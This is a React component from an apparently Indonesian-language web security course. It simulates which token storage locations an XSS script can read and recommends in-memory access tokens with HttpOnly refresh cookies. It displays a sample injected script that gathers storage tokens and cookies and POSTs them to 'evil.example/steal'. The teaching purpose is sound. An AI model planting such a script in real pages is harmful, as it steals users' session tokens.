"use client";

import { useEffect, useRef, useState } from "react";
import { useProgress } from "@/components/game/ProgressProvider";
import { useSender } from "@/components/lesson/useSender";
import { Button } from "@/components/ui/button";

const REF = "m2-l4/xss-storage";
const TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ…";

type Store = { id: string; name: string; where: string; script: string; leaks: boolean; why: string };

const STORES: Store[] = [
  { id: "ls", name: "localStorage", where: "Access token disimpan pakai localStorage.setItem", script: 'localStorage.getItem("access_token")', leaks: true, why: "Script apa pun di origin itu bisa baca, dan datanya bertahan setelah reload maupun antar tab." },
  { id: "ss", name: "sessionStorage", where: "Access token disimpan pakai sessionStorage.setItem", script: 'sessionStorage.getItem("access_token")', leaks: true, why: "Sama-sama bisa dibaca, bedanya cuma terbatas di satu tab." },
  { id: "global", name: "Variabel global JS", where: "Access token di window.accessToken", script: "window.accessToken", leaks: true, why: "Variabel global itu cuma properti window. Siapa pun bisa baca." },
  { id: "closure", name: "Variabel closure di memori", where: "Access token di variabel dalam module milik app sendiri", script: "window.accessToken", leaks: false, why: "Nggak ada di window atau storage yang nunjuk ke sini. Hilang saat reload, dan itu diperbaiki oleh refresh cookie." },
  { id: "cookie", name: "Cookie HttpOnly", where: "Refresh token di Set-Cookie: rt=…; HttpOnly", script: "document.cookie", leaks: false, why: "Browser nggak memasukkan cookie HttpOnly ke document.cookie. Script cuma lihat string kosong." },
];

/** A simulated page with five places a token could live, and an "XSS script" that tries to read each. No network. */
export function StorageSim() {
  const [ran, setRan] = useState(false);
  const [used, setUsed] = useState(false);
  const { isDone } = useProgress();
  const sent = useRef(false);
  const { fire, busy, awaitingLogin, openReauth } = useSender((o) => {
    if (!o.ok) sent.current = false;
  });

  useEffect(() => {
    if (!ran || sent.current || isDone(REF)) return;
    sent.current = true;
    void fire({ kind: "attack", ref: REF });
  }, [ran, isDone, fire]);

  return (
    <div className="max-w-3xl space-y-4 rounded-lg border p-4">
      <div className="space-y-1">
        <h3 className="text-sm font-semibold">Simulator XSS storage</h3>
        <p className="text-xs text-muted-foreground">
          Attacker berhasil menyelipkan script ini ke halaman. Script jalan dengan hak akses halaman itu sendiri. Nggak ada yang menyentuh network di sini.
        </p>
      </div>

      <pre className="overflow-x-auto rounded-md border bg-muted/30 p-3 font-mono text-[11px] leading-5">{`<script>
  // injected through a comment field
  const loot = [
    localStorage.getItem("access_token"),
    sessionStorage.getItem("access_token"),
    window.accessToken,
    document.cookie,
  ];
  fetch("https://evil.example/steal", { method: "POST", body: JSON.stringify(loot) });
</script>`}</pre>

      <div className="overflow-x-auto rounded-lg border">
        <table className="w-full text-left text-sm">
          <thead>
            <tr className="text-xs text-muted-foreground">
              <th className="px-3 py-2 font-medium">Token disimpan di mana</th>
              <th className="px-3 py-2 font-medium">Script membaca</th>
              <th className="px-3 py-2 font-medium">Hasil</th>
            </tr>
          </thead>
          <tbody>
            {STORES.map((s) => (
              <tr key={s.id} className="border-t align-top">
                <td className="px-3 py-2">
                  <p className="font-medium">{s.name}</p>
                  <p className="text-xs text-muted-foreground">{s.where}</p>
                </td>
                <td className="px-3 py-2 font-mono text-xs">{s.script}</td>
                <td className="px-3 py-2">
                  {!ran ? (
                    <span className="text-xs text-muted-foreground">belum dijalankan</span>
                  ) : (
                    <div className="space-y-1">
                      <span className={`font-semibold ${s.leaks ? "text-destructive" : "text-success"}`}>{s.leaks ? "bocor" : "nggak terbaca"}</span>
                      <p className="font-mono text-[11px] break-all">{s.leaks ? TOKEN : s.id === "cookie" ? '"" (kosong)' : "undefined"}</p>
                      <p className="text-xs text-muted-foreground">{s.why}</p>
                    </div>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="flex flex-wrap gap-2">
        <Button variant="outline" size="sm" onClick={() => setRan(true)}>
          Jalankan script XSS
        </Button>
        {ran && (
          <Button variant="outline" size="sm" onClick={() => setUsed(true)}>
            Panggil API dari halaman
          </Button>
        )}
      </div>

      {ran && (
        <p className="max-w-[68ch] text-sm">
          <strong className="font-semibold">Pola yang disarankan:</strong> simpan access token di memori dan refresh token di cookie HttpOnly, seperti di Lab 02. Script nggak bisa menyalin refresh token keluar. Access token apa pun yang berhasil diambil cuma berlaku sampai expired (5 menit di lab).
        </p>
      )}

      {used && (
        <div role="status" className="max-w-[68ch] space-y-1 rounded-md border border-warning/40 bg-warning/10 p-3 text-sm">
          <p>
            <strong className="font-semibold">Script tetap bisa memakai session selama halaman terbuka.</strong> Ia bisa memanggil <code className="font-mono text-xs">fetch(&quot;/refresh&quot;)</code>: browser menempelkan cookie HttpOnly sendiri, dan script menerima access token baru. Token itu bahkan bisa dikirim ke attacker, yang cuma bisa memakainya sampai expired.
          </p>
          <p>Refresh token nggak bisa dibawa kabur, jadi script nggak bisa terus bikin token baru setelah tab ditutup atau session kamu revoke. XSS tetap darurat. Pilihan storage cuma membatasi berapa lama dampaknya.</p>
        </div>
      )}

      {awaitingLogin && (
        <div className="flex items-center gap-2">
          <p role="status" className="text-sm text-muted-foreground">Login lagi buat nyimpen progress kamu.</p>
          <Button variant="outline" size="sm" disabled={busy} onClick={openReauth}>Login lagi</Button>
        </div>
      )}
    </div>
  );
}
